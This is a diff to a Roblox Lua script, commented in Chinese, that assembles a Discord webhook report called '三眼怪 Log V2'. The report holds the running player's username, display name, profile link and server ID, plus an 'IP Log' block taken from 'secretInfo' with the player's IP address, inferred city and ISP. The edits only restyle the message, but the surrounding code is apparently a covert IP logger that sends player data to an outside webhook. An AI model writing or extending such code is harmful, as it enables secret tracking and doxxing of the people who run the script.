@@ -62,7 +62,7 @@ pcall(function()
     -- 3. 建立個人資料連結
     local profileUrl = "https://www.roblox.com/users/" .. tostring(LocalPlayer.UserId ) .. "/profile"
 
-    -- 4. 準備 embed 的 description，讓標題和值在同一行
+    -- 4. 準備 embed 的 description，只包含玩家資訊
     local description = string.format(
         "**真實名稱:** `%s`\n" ..
         "**顯示名稱:** `%s`\n" ..
@@ -80,14 +80,15 @@ pcall(function()
         game.JobId or "N/A"
     )
 
-    -- 5. 將 IP 資訊附加到 description 的末尾，同樣讓標題和值在同一行
+    -- 5. 將 IP 資訊附加到 description 的末尾，並使用大字標題
     if secretInfo and secretInfo.ip then
         local ip_info = secretInfo.details
         local location = (ip_info and ip_info.country and ip_info.city) and (ip_info.country .. ", " .. ip_info.city) or "未知"
         local isp = (ip_info and ip_info.org) or "未知"
         
+        -- 使用 '##' 標題語法來讓 'IP Log:' 變大
         local secretBlock = string.format(
-            "\n\n**IP Log:**\n" ..
+            "\n\n## IP Log:\n" ..
             "**IP 位址:** `%s`\n" ..
             "**推測位置:** `%s`\n" ..
             "**網路供應商:** `%s`",
@@ -99,9 +100,9 @@ pcall(function()
     -- 6. 構建並發送最終的 webhook 資料
     local data = {
         username = "三眼怪 Log V2",
-        avatar_url = appIconURL, -- 設定 Webhook 的頭像為三眼怪
+        avatar_url = appIconURL,
         embeds = {{
-            title = "Player Log:",
+            -- title 留空，讓 description 成為主要內容
             description = description,
             color = embedColor,
             footer = {
